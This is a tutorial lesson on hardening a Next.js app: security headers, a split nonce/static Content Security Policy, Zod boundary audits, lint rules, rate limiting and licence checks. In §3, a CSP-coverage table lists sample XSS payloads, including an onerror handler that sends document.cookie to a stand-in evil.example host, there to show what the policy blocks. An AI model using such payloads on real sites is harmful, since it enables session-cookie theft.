---
title: 'Security Hardening: Next.js'
module: 24
lesson: 2
teaches: [content-security-policy, security-headers, output-encoding, sanitisation-policy, server-action-csrf, rate-limiting, npm-audit, licence-compliance]
produces: ['next-app/next.config.ts', 'next-app/package.json']
requires: [24.1, 16.4, 14.3]
---

# Lesson 24.2 — Security Hardening: Next.js

## Quick Overview

The Next.js application is the part of the system the public actually talks to, and it holds the
session cookies. Its hardening is layered. **Headers first**: a Content Security Policy that
actually restricts script sources, plus `Strict-Transport-Security`,
`Referrer-Policy: strict-origin-when-cross-origin`, `X-Content-Type-Options`,
`Permissions-Policy` and a frame policy. CSP is the one that takes real work, because Next
inlines the RSC payload as a `<script>` and a naive `script-src 'self'` breaks the app. The
honest answer is a **trade**, not a technique: a per-request nonce has to be read back with
`headers()`, which makes every route dynamic and undoes Lesson 18.1. So the policy splits — a
static `script-src` for the prerendered routes, a nonce for the personalised paths that are
dynamic anyway — and the lesson says exactly what the weaker directive costs you and what the
rest of the policy still buys.

**Then the boundaries.** Zod at every entry point, because WordPress is not a trusted client and
neither is a form post. Output encoding by default, with `dangerouslySetInnerHTML` confined to
`src/components/blocks/RichText.tsx` and a strict sanitiser allowlist — one file, so a reviewer
can grep for the pattern and find exactly one hit. CSRF considerations on Server Actions,
including what Next gives you and what it does not. Rate limiting on every route handler that
does work, since `/api/revalidate` and `/api/auth/refresh` are unauthenticated by construction
until the signature or cookie is checked. Then `npm audit` in CI with a triage policy.

And **dependency licences**, which is a compliance control rather than a security one but belongs
in the same gate. `next-app` is proprietary application code, so **no GPL or AGPL dependency may
enter it** — a copyleft licence on a bundled library propagates its terms to what you distribute.
Meanwhile `wordpress-headless/wp-content/plugins/blame-the-tech-core` **is GPL, by design**,
because it is a WordPress plugin and derives from GPL code. Two directories in one repository
with genuinely opposite licence rules. Learn the distinction, then enforce it with an allowlist
per directory.

By the end of this lesson you will have:

- A split CSP set in `proxy.ts` — static for prerendered routes, nonce-based for the
  personalised ones — report-only first, then enforcing —
  plus the full security-header set, verified against the deployed response, not the config file
- A validation audit: every route handler, Server Action and webhook, each with a Zod schema at
  the boundary
- A written `dangerouslySetInnerHTML` policy and a lint rule keeping it to the one sanitising file
- Rate limiting on every route handler that does work, with the limits chosen and justified
- `npm audit` in CI with a triage and exception policy that is not "ignore everything"
- A per-directory licence allowlist: no GPL/AGPL in `next-app`, GPL required for the WordPress
  plugin, enforced as a check

## Classic WP Analogy

The escaping discipline transfers directly, and if you have written WordPress plugin code to
standard you already have the right reflexes.

| Classic WordPress | Next.js |
|---|---|
| `esc_html()`, `esc_attr()`, `esc_url()` | React escapes by default — the safe path is the default |
| `wp_kses_post()` on untrusted HTML | A sanitiser allowlist inside `RichText.tsx` |
| `wp_nonce_field()` + `check_admin_referer()` | Server Action origin checks and same-site cookies |
| `sanitize_text_field()` on `$_POST` | `zod.parse()` at the boundary |
| `$wpdb->prepare()` | No SQL here — but the same principle at the GraphQL variable layer |
| A security plugin adding headers | `headers()` in `next.config.ts`, versioned in git |
| GPL, because WordPress is GPL | **No GPL** — `next-app` is proprietary |

React's default escaping is a genuine improvement on the WordPress model: in PHP, forgetting
`esc_html()` produced working code with an XSS hole, so safety required vigilance on every
`echo`. In JSX, `{value}` is escaped and rendering raw HTML requires typing
`dangerouslySetInnerHTML` — a name chosen to be unpleasant. The unsafe path is opt-in, loud, and
greppable.

Where the analogy breaks is the licence row, and it is the one people get wrong because the
WordPress ecosystem's answer is so uniform. In WordPress, GPL is simply the water: core is GPL,
your plugin is GPL, the plugin you copied a helper from is GPL, and the only question anyone ever
asks is whether a JavaScript build artifact counts. Bringing that reflex into `next-app` is a real
problem. Bundling an AGPL library into a proprietary front end you distribute to every visitor's
browser is a licence violation with commercial consequences, and it happens by accident through a
transitive dependency nobody reviewed. **Two directories, two licence regimes, one repository** —
so the check has to be per-directory, and it has to run in CI, because no reviewer reads a
`package-lock.json` diff.

---

## Key Concepts

### 1. The header set: what each one buys, and what it does not

Six headers, none of them a substitute for a boundary check. Read the fourth column before the
third: a header whose failure mode you cannot state is a header you will remove during the first
incident it is blamed for.

| Header | Value | What it actually prevents | What it does **not** |
|---|---|---|---|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | a downgrade to `http://` after the first visit | anything on the *first* visit, unless you are in the preload list |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | leaking a full path — including a `?next=/en/account` — to a third party | leaking the origin itself |
| `X-Content-Type-Options` | `nosniff` | an uploaded `.txt` being executed as script because a browser guessed | a genuinely wrong `Content-Type` you set yourself |
| `X-Frame-Options` | superseded by `frame-ancestors` | clickjacking in browsers older than the CSP directive | anything modern browsers do not already get from CSP |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=()` | a third-party script or iframe silently asking for a sensor | a first-party script you wrote asking for one |
| `Content-Security-Policy` | see §2 | script and connection sources, and the exfiltration step of most XSS | the injection itself |

Two rows are admissions rather than caveats. HSTS does nothing on a first-ever visit over `http`,
which is why the preload list exists and why joining it is a one-way door — `max-age=63072000` is
two years of every browser refusing plain HTTP for your domain, unrecallable. And a CSP does not
stop an injection; it stops the injected script from *doing* anything useful, which is a
different and still valuable claim. `X-Frame-Options` is in the table because someone will ask:
it is redundant with `frame-ancestors 'none'` in every browser released this decade, and
deleting it is as defensible as keeping it.

### 2. The CSP collides with Module 18, and the collision is the lesson

The naive plan: generate a nonce per request in proxy, put it in the CSP, let Next attach it
to its own `<script>` tags. Every guide says this. **It would forfeit every statically-rendered
route in this application.**

The mechanism, precisely. A nonce must appear in **two** places: the `Content-Security-Policy`
header *and* the `nonce=` attribute of every script tag in the HTML. Next puts it in the HTML
during **render**. A prerendered route was rendered at build time, when there was no request and
therefore no nonce, so its cached HTML has no `nonce=` attributes. Serve that cached HTML with a
per-request nonce header and every script is blocked.

```
STATIC ROUTE + PER-REQUEST NONCE            DYNAMIC ROUTE + PER-REQUEST NONCE
─────────────────────────────────           ─────────────────────────────────
build:  render → HTML with NO nonce         request: mint nonce
request: mint nonce  n=abc                  render:  HTML with nonce="abc"
        serve cached HTML                   serve:   CSP nonce-abc
        CSP: script-src 'nonce-abc'                  │
                │                                    ▼
                ▼                                  works
        every <script> blocked
        (no nonce attribute to match)
```

So a nonce forces dynamic rendering — **exactly** what Lesson 18.1 spent a whole lesson undoing
and what Module 21's budgets are measured against. 18.1 moved the session read out of the root
layout for this class of reason: anything there reading `headers()` or `cookies()` opts *every*
route out of the Full Route Cache. A nonce read in the root layout is that, with a security
justification attached.

And there is a second fact that makes a hybrid impossible: **`'unsafe-inline'` in `script-src` is
ignored by the browser whenever a nonce or hash is also present.** You cannot write one policy
that satisfies both a prerendered page and a per-request nonce. It has to be two policies.

### 3. The frozen split, and what each half costs

| | Statically-generated routes | The personalised routes |
|---|---|---|
| Which | everything except the two below | `/[locale]/account/**`, `/[locale]/incidents/submit` |
| Rendering | prerendered, Full Route Cache | already dynamic — Lesson 15.5 guards them and 18.4 sets `private, no-store` |
| `script-src` | `'self' 'unsafe-inline'` | `'self' 'nonce-<per-request>'` |
| Cost | inline script is permitted | none; these routes were never cacheable |
| Who sets it | `proxy.ts`, one constant string | `proxy.ts`, one minted value |

The personalised list is not a new decision: Lesson 18.4's `headers()` already excludes those
paths from any shared cache and Lesson 15.5's gate already forces a session on them. They are
dynamic whatever this lesson does, so a nonce there costs nothing not already spent.

**Why `'unsafe-inline'` is unavoidable on the static half**, exactly: Next serialises the RSC
flight payload into the HTML as `<script>self.__next_f.push(…)</script>` elements, generated per
page, dependent on the rendered tree, with no build-time hash you could enumerate in a config
file. `'strict-dynamic'` does not help — it still needs a nonce or hash to bootstrap. What
`'unsafe-inline'` on `script-src` costs you, honestly:

| Attack | Blocked by the static policy? |
|---|---|
| Injected `<script>alert(1)</script>` | **no** — this is what `'unsafe-inline'` permits |
| Injected `<script src="https://evil.example/x.js">` | **yes** — `script-src 'self'` |
| Injected `<img src=x onerror="fetch('https://evil.example?c='+document.cookie)">` | **the exfiltration is blocked** by `connect-src`; the handler still runs |
| `<form action="https://evil.example">` swapped in | **yes** — `form-action 'self'` |
| Page framed for clickjacking | **yes** — `frame-ancestors 'none'` |
| `eval()` of an attacker-controlled string | **yes** — no `'unsafe-eval'` |
| `<base href="https://evil.example">` rewriting every relative URL | **yes** — `base-uri 'none'` |
| Flash/Java object embed | **yes** — `object-src 'none'` |

Six of eight, and both survivors need a stored-XSS hole to exist first — which is what
`RichText.tsx`'s sanitiser and React's default escaping are for. The strict rest of the policy is
not consolation, it is most of the value; say that out loud when someone reads `'unsafe-inline'`
in the diff and assumes you gave up.

**The reversal condition.** If Next ships per-page inline-script hashes at build time, move the
static half to a hash-based policy. Until then the alternative on offer is not "a strict CSP", it
is "a strict CSP and no static rendering", and Module 21's budgets are what would pay for it.

### 4. One owner for the CSP, because two headers are an intersection

`next.config.ts`'s `headers()` and `proxy.ts` can both set a response header, and if both
set `Content-Security-Policy` the browser enforces **both** — the intersection, not the last one
written. That is a rule almost nobody remembers at 2am, so this lesson does not create the
situation:

| Header | Owner | Why there |
|---|---|---|
| the five static headers | `next.config.ts` `headers()` — **appended to Lesson 18.4's function** | one entry, every path, no per-request input |
| `Content-Security-Policy` | `proxy.ts`, and nowhere else | the nonce variant needs a **request** header, which only proxy can set |

The third column of the second row is decisive. Next propagates a nonce to its own script tags by
reading the `Content-Security-Policy` header off the **incoming request**, so the nonce path
structurally requires proxy — and splitting the CSP across two files would let the two
halves disagree. One file, one string builder.

**What that costs, and it is a real cost.** `config.matcher` is
`'/((?!api|_next|favicon\.ico|.*\..*).*)'` and **no lesson may edit it** — Lesson 15.5 §4 spends
a whole Key Concept forbidding it and Lesson 20.3 obeyed it. So proxy never runs for:

| Path | Gets a CSP? | Is that acceptable? |
|---|---|---|
| `/sitemap.xml`, `/robots.txt` | **no** — the `.*\..*` branch excludes any path with a dot | yes: XML and text, no script execution, and `nosniff` from `next.config.ts` still reaches them |
| `/opengraph-image` | no — it lives under `src/app/[locale]/` and has no extension, but it is an image response | yes, same reasoning |
| `/api/*` | no — excluded explicitly | yes: JSON responses, and `nosniff` is the header that matters |
| `/_next/static/*` | no | yes: the scripts themselves, already covered by the policy on the page that loads them |
| every HTML page route | **yes** | this is the entire point |

Every one is a document that cannot execute a script, and every one still gets `nosniff`, the
header that stops a browser deciding otherwise. If a future lesson adds an HTML route with a dot
in its path, that route silently loses its CSP — which is why the verification greps a response
rather than the config.

### 5. Report-only first, and how long is long enough

A CSP you have not observed is a CSP that breaks something you cannot predict. Ship
`Content-Security-Policy-Report-Only` first: the browser evaluates the policy, reports every
violation, and blocks nothing.

```js
// eslint.config.mjs and next.config.ts are elsewhere; this is the switch, in proxy.ts
const CSP_MODE = 'report-only'; // → 'enforce', in a PR whose only content is this line
```

A constant, not an environment variable, and deliberately so: flipping it is a **one-line pull
request**, which is the ratchet discipline Lesson 21.4 argues for and Lesson 24.5 restates. An
environment variable makes the change invisible in git history and makes staging and production
capable of disagreeing about it.

| Question | This course's answer |
|---|---|
| How long in report-only? | **two weeks minimum**, and it must include one full content-publishing cycle plus one deploy of every route |
| What do you look at? | violation reports grouped by `blocked-uri` and `effective-directive`, sorted by count |
| What are you looking *for*? | a `blocked-uri` you recognise — your analytics, your font host, Cloudflare Turnstile's script — which means the allowlist is wrong, not the page |
| What do you ignore? | `blocked-uri: inline` from browser extensions, and `about`/`data` noise. Both are unfixable and both are most of the volume |
| When do you enforce? | when a week passes with no report you cannot explain |

Two weeks is not arbitrary: a shorter window misses anything an editor publishes rarely — an
embed block, a script pasted into a Custom HTML block — and those are the violations that turn
into "the marketing page is blank" the day you enforce.

**Where do reports go?** `report-uri` needs a collector. Lesson 24.3 adds Sentry, whose ingest
endpoint accepts CSP reports, so `report-uri` is added there rather than here — this lesson ships
report-only with reports going to the browser console, which is enough for the two weeks of
first-party debugging and nowhere near enough for real traffic. Named rather than hidden.

### 6. Proxy's fourth concern, and why the order is frozen

`proxy.ts` will hold four concerns in this order, and the order is not negotiable:

```
1. mint a request id                 ← Lesson 24.3 adds this, FIRST
2. next-intl locale handling         ← Lesson 20.3; MAY return a redirect
3. the auth gate                     ← Lesson 15.5; MAY replace that with a redirect
4. attach response headers           ← THIS LESSON, last
```

Each position is forced by something:

| Step | Why it cannot move |
|---|---|
| 1 first | the id must be on **every** response, including a redirect. Mint it after step 2 and a locale redirect leaves the trace |
| 2 before 3 | the gate slices `locale.length + 1` characters off the path. Run it on an un-prefixed path and it slices the wrong ones (Lesson 20.3's comment says so) |
| 3 returns early | an unauthenticated request must not reach step 4 with a body |
| 4 last | it decorates **whatever response is being returned**, redirect included. Set headers before step 2 and a locale redirect throws them away |

Step 4 being last is the reason this lesson's code is three lines rather than a rewrite. It reads
the response the earlier steps produced and sets headers on it. It does not decide anything.

### 7. Zod at every entry point, and the audit that proves it

The module's boundary rule: **WordPress is not a trusted client and neither is a form post.**
Lesson 16.1 built `src/lib/validation/schemas.ts`; this lesson audits every entry point against
it and produces the table. An entry point with no schema is not a style problem, it is an
un-typed `unknown` reaching a GraphQL variable.

| Entry point | Input | Validated by | Rate limited |
|---|---|---|---|
| `POST /api/revalidate` (18.3) | JSON body | Zod, then a **fixed-order** HMAC / type / secret check | no — HMAC-gated, cookieless |
| `GET /api/preview` (17.2) | query string | Zod on `token`, `id`, `next`; `next` re-checked as a same-origin path | no — single-use transient is the limit |
| `GET /api/preview/exit` (17.2) | none | n/a — reads no input | no |
| `GET /api/health` (09.5) | none | n/a | **no, on purpose** — a monitor must not be throttled |
| `POST /api/auth/refresh` (15.4) | cookie only | n/a — no body is read | **the gap this lesson closes** |
| `POST /api/vitals` (21.x) | JSON body | Zod | yes, `src/lib/rate-limit.ts` |
| `submitIncident` (16.2) | form data | Zod, and **re-validated in PHP** (06.2 §3) | yes |
| `submitLead` (16.3) | form data | Zod + Turnstile, re-validated in PHP | yes |
| `login` / `logout` / `register` / `verify` (15.3, 15.4) | form data | Zod since 16.1 | yes |

Three observations the table produces that prose would not. **`/api/health` has no rate limit and
that is correct** — throttling your own monitor turns a health check into a source of alerts.
Every write is validated **twice**, in TypeScript and again in PHP, because Next is a client of
WordPress and a client's validation is a user-experience feature. And `/api/auth/refresh` is the
one row with a real gap, named as debt for this pass by Lesson 15.5's own "Known gaps" list.
Step 5 pays it.

### 8. Rate limiting: the three-stage thread, closed

This is the review pass Lesson 15.5 promised, and the point of doing it as a review rather than a
feature is that all three stages are still visible in git history:

| Stage | What it was | Status |
|---|---|---|
| 15.4 | an in-memory `Map` in `src/actions/auth.ts` | **deleted** by 16.2. A `Map` survives no cold start and spans no instance |
| 16.2 | `src/lib/rate-limit.ts` — Upstash, per IP, **fails closed** | current. Reuse it; do not write a second limiter |
| 16.2 | a WordPress-side per-user transient in the mutation | current, and the **authoritative** one |

Two limiters is not redundancy, it is a division of labour: the Next limiter is keyed on IP and
sheds load before a request costs a WordPress round trip; the WordPress limiter is keyed on the
user and cannot be bypassed by talking to `/graphql` directly. Deleting the WordPress one is the
worse of the two downgrades.

`limit()` returns a three-case verdict — `ok`, `exceeded`, `unavailable` — and **`unavailable`
refuses the write.** A limiter that opens when Redis is down is a limiter an attacker disables by
attacking Redis. When you add it to `/api/auth/refresh` in Step 5, the `unavailable` branch must
return the same status as `exceeded`, because a caller who can distinguish them learns whether
your Redis is up.

### 9. Two directories, two licence regimes, one repository

This is where the WordPress reflex is actively wrong, because GPL is simply the water in that
world: core is GPL, your plugin is GPL, the plugin you copied a helper from is GPL.

```
wordpress-headless/wp-content/plugins/     next-app/
  blame-the-tech-core                        package.json  "license": "MIT"
  ─────────────────────────────────          ─────────────────────────────────
  WordPress is GPL-2.0-or-later and a        A separate program, proprietary,
  plugin calling its APIs is a               distributed to every visitor's
  derivative work.                           browser as JavaScript.
  GPL dependency: fine, expected.            GPL / AGPL dependency: violation.
```

Lesson 07.1 §9 already banned GPL and AGPL in `next-app` and set `"license": "MIT"` in
`package.json` — the fact that makes a GPL dependency here a licensing problem rather than a
preference. Lesson 17.1 already made you run `npm view @faustwp/core license` rather than trust
an assertion. This lesson turns both into a check that runs without you, **per directory**, in
CI, because no reviewer reads a `package-lock.json` diff. AGPL is worth naming separately: its
network clause treats *use over a network* as distribution, so an AGPL library in a hosted front
end triggers the copyleft obligation even though you shipped no binary to anyone.

### 10. `npm audit` needs a triage policy, or it becomes noise

`npm audit` reports advisories against your dependency tree. Run it with no policy and within a
month you have either a permanently red gate or `--audit-level=critical`, which is the same as
not running it.

| Severity | Reachable from shipped code? | Action | Deadline |
|---|---|---|---|
| critical / high | yes | fix, or replace the dependency | **7 days**, and the PR blocks |
| critical / high | no — devDependency only | fix at the next dependency bump | 30 days |
| moderate | yes | fix at the next dependency bump | 30 days |
| moderate / low | no | record, do not act | — |
| any, with **no fix available** | either | an **expiring** exception in `package.json` `overrides` or a dated comment, with a named owner | re-reviewed monthly |

The load-bearing word is **expiring**. An exception with no date is a permanent silence, and
`npm audit` gates get switched off because somebody added one and then nobody could tell
"triaged" from "ignored". Every exception here carries a date and a name, and the monthly review
belongs to a person. CI runs `npm audit --omit=dev --audit-level=high` as the blocking form and
`npm audit` unfiltered as an advisory step, so the full picture is visible without blocking a
merge.

---

## Task

### Step 1: Append the static headers to Lesson 18.4's `headers()`

An **anchored fragment**. `next.config.ts` already holds `reactStrictMode`, `images`,
`experimental.serverActions.allowedOrigins`, `async headers()`, `trailingSlash` and
`async redirects()`, and its export is wrapped by 20.3 and nested by 21.3. **Add one entry to
the existing `headers()` array. Not a second function, and do not retype the file.**

```ts
// next-app/next.config.ts — ONE new entry, appended to the array Lesson 18.4's
// `async headers()` already returns. Every existing entry stays exactly as it is.
//
// This source OVERLAPS the /_next and /api entries above it, and that is fine:
// Next merges entries from every matching source, and a collision only matters
// when two entries set the same KEY. These five keys appear nowhere else.
// NO Content-Security-Policy here — proxy.ts is its only owner (§4).
      {
        source: '/:path*',
        headers: [
          {
            // Two years, subdomains included, preload-eligible. A ONE-WAY DOOR:
            // once you submit to the preload list, every browser refuses plain
            // HTTP for this domain and you cannot recall it. Read §1 first.
            key: 'Strict-Transport-Security',
            value: 'max-age=63072000; includeSubDomains; preload',
          },
          {
            // Full URL to same-origin, origin only cross-origin. Stops a path
            // like /en/login?next=/en/account reaching a third party.
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
          {
            // The header that matters most for the paths proxy cannot
            // reach: /sitemap.xml, /robots.txt, /api/*, /_next/*. See §4.
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            // Redundant with `frame-ancestors 'none'` in every browser released
            // this decade. One line, kept for the one you cannot name.
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            // Empty allowlists, not `self`: nothing in this app asks for a
            // sensor, so an ask is a bug or an injected third party.
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=(), payment=(), usb=()',
          },
        ],
      },
```

**Verify §1:**

- [ ] `npm run build` succeeds. A malformed `source` is a build-time error.
- [ ] `grep -c 'async headers' next.config.ts` is **`1`**. Two means you added a function
      instead of an entry, and the second one silently wins for every path it matches.
- [ ] `grep -c 'withNextIntl' next.config.ts` is **`2`**. A `1` means you replaced the wrapper
      and removed i18n from the build **with no error**: pages render and every `t()` throws on
      the first request.
- [ ] `grep -c 's-maxage' next.config.ts` is still `1` — 18.4's `/_next/image` entry and nothing
      else. If it grew, you cached HTML at the edge and 18.3's webhook cannot purge it.
- [ ] `grep -c 'Content-Security-Policy' next.config.ts` is `0`. One owner (§4).

### Step 2: Write the policy builder and give proxy its fourth concern

Two edits to one file. The builder first, at module scope so nothing is recomputed per request:

```ts
// next-app/src/proxy.ts — ADD above the existing proxy() function.
// The imports (createMiddleware, NextResponse, NextRequest, AT_COOKIE,
// secondsUntilExpiry, routing) are already there from Lessons 15.5 and 20.3.

/**
 * report-only until the reports are clean. Flip to 'enforce' in a pull request
 * whose ONLY content is this line — the ratchet discipline from Lesson 21.4,
 * restated by 24.5. Not an env var: an env var makes the change invisible in
 * git history and lets staging and production disagree about it.
 */
const CSP_MODE: 'report-only' | 'enforce' = 'report-only';

/** Dynamic already: Lesson 15.5 guards them, Lesson 18.4 sets `private, no-store`. */
const NONCE_PATHS: readonly string[] = ['/account', '/incidents/submit'];

/**
 * Everything except script-src. Identical in both variants, so there is exactly
 * one place to add a host to an allowlist.
 *
 * `connect-src` is what turns most XSS into a blocked exfiltration attempt:
 * an injected handler may run under 'unsafe-inline', but it cannot POST the
 * cookie anywhere. Add the Upstash and Sentry ingest origins here, never `*`.
 */
const SHARED_DIRECTIVES = [
  "default-src 'self'",
  "style-src 'self' 'unsafe-inline'", // Tailwind emits inline <style> during dev; a hash set is not stable
  "img-src 'self' data: blob: http://localhost:8080 https://*.blamethe.tech",
  "font-src 'self' data:",
  "connect-src 'self' https://*.ingest.sentry.io",
  "frame-src https://challenges.cloudflare.com", // Turnstile (Lesson 16.3) renders in an iframe
  "object-src 'none'",
  "base-uri 'none'",
  "frame-ancestors 'none'",
  "form-action 'self'",
  'upgrade-insecure-requests',
].join('; ');

/**
 * The STATIC policy. `'unsafe-inline'` on script-src is deliberate and §3 lists
 * exactly what it costs: Next serialises the RSC flight payload as
 * `<script>self.__next_f.push(…)</script>`, generated per page, with no
 * build-time hash to enumerate. The alternative is not a stricter policy — it
 * is losing the Full Route Cache on every route (Lesson 18.1).
 */
const STATIC_CSP = `script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; ${SHARED_DIRECTIVES}`;

/**
 * The NONCE policy, for routes that are dynamic anyway. NO 'unsafe-inline':
 * browsers ignore it whenever a nonce is present, so writing both would be a
 * lie in a diff.
 */
function nonceCsp(nonce: string): string {
  return `script-src 'self' 'nonce-${nonce}' https://challenges.cloudflare.com; ${SHARED_DIRECTIVES}`;
}

function isNoncePath(pathname: string, locale: string): boolean {
  const rest = pathname.slice(locale.length + 1);

  return NONCE_PATHS.some((prefix) => rest === prefix || rest.startsWith(`${prefix}/`));
}
```

Then the fourth concern. Concerns 1 to 3 are unchanged; this replaces the last three lines of
the existing function:

```ts
// next-app/src/proxy.ts — the tail of the existing proxy() body.
// Concerns 1-3 (locale, near-expiry hand-off, the gate) are UNCHANGED from
// Lessons 20.3 and 15.5. Lesson 24.3 inserts request-id minting ABOVE them.

  // ── 4. SECURITY HEADERS — LAST, on whatever response is being returned ──
  // Including a redirect. Setting these before concern 2 would attach them to a
  // response next-intl then discards. §6 has the full ordering argument.
  const header = CSP_MODE === 'enforce'
    ? 'Content-Security-Policy'
    : 'Content-Security-Policy-Report-Only';

  if (isNoncePath(pathname, locale)) {
    // crypto.randomUUID() is a global in the Node runtime proxy runs in — no import.
    // A nonce must be unguessable and per-request; it does not need to be long.
    const nonce = crypto.randomUUID();
    const policy = nonceCsp(nonce);

    // Next reads the CSP off the INCOMING REQUEST to attach the nonce to its own
    // <script> tags, which is why only proxy can do this half. A route
    // component that renders its own <Script> reads headers().get('x-btt-nonce').
    request.headers.set('x-btt-nonce', nonce);
    request.headers.set(header, policy);
    response.headers.set(header, policy);
  } else {
    response.headers.set(header, STATIC_CSP);
  }

  return response;
}
```

> **`response` is next-intl's object, not `NextResponse.next()`.** Lesson 20.3 returns
> next-intl's response on every non-redirect path because it carries the `NEXT_LOCALE` cookie and
> next-intl's internal request headers. `grep -c 'NextResponse.next()' src/proxy.ts` must
> stay `0`. Building a fresh response here to hang a header on would produce a locale that
> resolves inconsistently, with no error.

**Verify §2:**

- [ ] `git diff src/proxy.ts | grep -E '^[-+].*matcher'` prints **nothing**.
      `config.matcher` is `'/((?!api|_next|favicon\.ico|.*\..*).*)'` and no lesson may edit it —
      Lesson 15.5 §4 spends a Key Concept forbidding it and Lesson 20.3 obeyed it.
- [ ] `grep -c "'unsafe-eval'" src/proxy.ts` is `0`. Verification check 4 asserts it against
      a response as well, because a config file is not evidence.
- [ ] `grep -c 'unsafe-inline' src/proxy.ts` is `2` — `script-src` on the static variant and
      `style-src` in the shared block. Three means it is in `nonceCsp` too, where the browser
      ignores it and the diff misleads the next reader.
- [ ] `grep -c 'NextResponse.next()' src/proxy.ts` and `grep -c 'fetch(' src/proxy.ts`
      are both `0`, and `CSP_MODE` is `'report-only'` — enforcing on the first commit skips §5.

### Step 3: One ESLint config object, and delete the script it replaces

`eslint.config.mjs` was created by 07.5 and extended by 08.1, 09.1, 11.4, 23.5 and 23.7. **Add
config objects; do not reprint the file.** `npm run lint` uses `--max-warnings=0`, so a rule at
`warn` still fails the build — every rule below is `error`, because pretending otherwise would be
theatre.

```js
// next-app/eslint.config.mjs — TWO new objects, appended BEFORE the final
// `prettier` element. prettier must stay last (Lesson 07.5): it only disables
// rules, so anything after it could re-enable a formatting rule.
//
// NOTHING HERE TOUCHES linterOptions. Lesson 07.5 Step 2 already set
// `reportUnusedDisableDirectives: 'error'`, and adding a second `linterOptions`
// block would silently win over its own. Verify it; do not re-add it.
  {
    files: ['**/*.{ts,tsx}'],
    rules: {
      'no-restricted-syntax': [
        'error',
        {
          // The house invariant from Lesson 14.3: exactly ONE file may render
          // raw HTML, and it sanitises with isomorphic-dompurify against a
          // strict allowlist. Enforced by grep since 14.3; enforced by the
          // linter from now on. The exemption is the object below.
          selector: 'JSXAttribute[name.name="dangerouslySetInnerHTML"]',
          message:
            'dangerouslySetInnerHTML lives in src/components/blocks/RichText.tsx and nowhere else (Lesson 14.3). Render through BlockRenderer, or sanitise in RichText.',
        },
        {
          // Promoted from scripts/check-tag-literals.mjs (Lesson 18.2), whose
          // PATTERNS array was written as an explicit commented list precisely
          // so this translation would be mechanical. Node and term tags.
          selector:
            'Literal[value=/^(incident|post|review|page|menu|scapegoat|severity|stack):/]',
          message:
            'Hand-typed cache tag. Build it with src/lib/graphql/tags.ts — a tag PHP cannot reproduce invalidates nothing and reports success (Lesson 18.2 §3).',
        },
        {
          // List tags and the one singleton, whole-string.
          selector:
            'Literal[value=/^(incidents|posts|reviews|pages|scapegoats|severities|stacks|site-settings)$/]',
          message:
            'Hand-typed cache tag. Use listTag() / taxonomyListTag() / siteTag() from src/lib/graphql/tags.ts (Lesson 18.2 §3).',
        },
        {
          // The template-literal form the script also caught: `incident:${slug}`.
          selector:
            'TemplateElement[value.raw=/^(incident|post|review|page|menu|scapegoat|severity|stack):/]',
          message:
            'Hand-built cache tag in a template literal. Use src/lib/graphql/tags.ts (Lesson 18.2 §3).',
        },
      ],
    },
  },
  {
    // The two files whose whole job is to construct these strings, and the one
    // file allowed to render raw HTML. Same allowlist the script carried.
    files: [
      'src/lib/graphql/tags.ts',
      'src/lib/graphql/tags.test.ts',
      'src/components/blocks/RichText.tsx',
    ],
    rules: { 'no-restricted-syntax': 'off' },
  },
```

Then retire the script. **The rule replaces it; they do not coexist.**

```bash
cd next-app
git rm scripts/check-tag-literals.mjs
npm pkg delete scripts.lint:tags
```

And convert Lesson 18.2's one escape marker, which 18.2 predicted this lesson would do:

```tsx
// next-app/src/app/[locale]/[...slug]/page.tsx — replace the `// not-a-cache-tag:`
// marker with the linter's own mechanism. Same reason, same line.
// eslint-disable-next-line no-restricted-syntax -- route segments, not cache tags (Lesson 18.2 §5)
const RESERVED = new Set(['hobt', 'blog', 'incidents', 'reviews', 'scapegoats']);
```

> **Deleting the script is the decision, and here is the argument.** The script's `// not-a-cache-tag:`
> marker can never go stale — nothing checks whether the line it exempts still matches a pattern.
> An `eslint-disable-next-line` **can** go stale, and Lesson 07.5's
> `reportUnusedDisableDirectives: 'error'` makes a stale one an error. Coverage also
> improves: ESLint lints `e2e/`, `scripts/` and the config files the script never walked, and
> already ignores `src/gql/**` (07.5), which the script had to skip by hand. The cost is that a
> single command now hides three rules instead of one, which is what `npm run lint`'s output is
> for.

**Verify §3:**

- [ ] `grep -c 'reportUnusedDisableDirectives' eslint.config.mjs` is **`1`**. Lesson 07.5 set it;
      this lesson **verifies** it. A `2` means you added a second `linterOptions` block, which
      wins over 07.5's silently and is the kind of change a diff makes look harmless.
- [ ] `npm run lint` exits `0`. If it fails on `[...slug]/page.tsx`, the disable comment is on
      the wrong line — it must sit immediately above, with no blank line between.
- [ ] `npm pkg get scripts.lint:tags` prints `{}`, and `grep -rc 'not-a-cache-tag' src/` finds
      nothing. Lessons 18.2 to 18.4 chain `npm run lint:tags`; after this step that command is
      gone **on purpose** and the rule runs inside `npm run lint`.
- [ ] Verification checks 8 and 9 prove the rules fire on a probe and not on the real code. Do
      not skip them: a selector that matches nothing is a green lint run and no protection.

### Step 4: Audit the boundaries and write the table down

Fill in Key Concept 7's table for **your** code, by reading each entry point rather than trusting
the table. Then append one section to `docs/quality-gates.md`, the file 15.5 created and 16.4,
17.2 and 18.3 appended to. **Lesson 24.5 extends it with the full CI gate table — a different
section, which you do not write.**

```markdown
<!-- docs/quality-gates.md — append ONE section. 24.5 adds its own; never edit another's. -->

## Boundary hardening (Lesson 24.2)

Every entry point, audited on 24.2's date. The columns AuthN / AuthZ / Validation / Rate limit /
CSRF are Lesson 15.5's; this section records what changed and what is still open.

| Entry point | Validation | Rate limit | Change in 24.2 |
|---|---|---|---|
| `POST /api/revalidate` | Zod, then fixed-order HMAC / type / secret | n/a — cookieless, HMAC | none |
| `GET /api/preview` | Zod; `next` re-checked as a same-origin path | n/a — single-use transient | none |
| `GET /api/preview/exit` | reads no input | n/a | none |
| `GET /api/health` | takes no input | **none, on purpose** | none |
| `POST /api/auth/refresh` | no body read | **added: `limit()` keyed on IP** | closes gap 1 of 15.5 |
| `POST /api/vitals` | Zod | `limit()` | none |
| `submitIncident` | Zod + PHP re-validation | `limit()` + WP transient | none |
| `submitLead` | Zod + Turnstile + PHP re-validation | `limit()` + WP transient | none |
